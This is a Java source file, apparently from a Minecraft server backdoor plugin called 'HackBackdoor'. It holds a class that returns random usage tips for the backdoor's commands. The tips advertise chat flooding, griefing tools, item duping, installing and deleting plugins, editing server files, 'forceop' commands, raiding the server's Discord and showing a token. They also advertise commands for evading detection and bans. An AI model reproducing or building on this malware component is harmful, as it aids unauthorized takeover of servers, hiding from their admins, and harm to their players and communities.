
package me.system.runner.methods;

import me.system.runner.utils.Settings;

import java.util.Random;

public class Tips {
    public static String getTip() {
        String[] arr2 = new String[]{"Remember to flood chat using " + Settings.RED + "'flood'", "Dont get banned by using " + Settings.RED + "'togglecmds' & 'lockconsole'", "Good griefing tools are " + Settings.RED + "'bombs'", "Talk to other" + Settings.NAME + " users using " + Settings.RED + "'sc <message>'", "Talk in regular chat using " + Settings.RED + "'chat <message>'", "Enter file navigation using " + Settings.RED + "'fn'", "To make sure you don't get caught, use " + Settings.RED + "'blatant'", "Dupe your items with " + Settings.RED + "'dupe'", "Install other plugins with " + Settings.RED + "'install'", "Delete other plugins with " + Settings.RED + "'delplugin'", "Edit/delete files on the server using " + Settings.RED + "'edit'", "There are " + Settings.RED + "over 100  forceop commands", "Raid the servers discord using " + Settings.RED + "'discordraider'", "Change the theme of HackBackdoor using " + Settings.RED + "'theme'", "To test if you can use discord raider, use " + Settings.RED + "'showtoken'", "Use griefing wands with " + Settings.RED + "'wands'", "Connect to " + Settings.NAME + " console using " + Settings.RED + "'consoleconnect'"};
        Random r2 = new Random();
        int randomNumber = r2.nextInt(arr2.length);
        return arr2[randomNumber];
    }
}

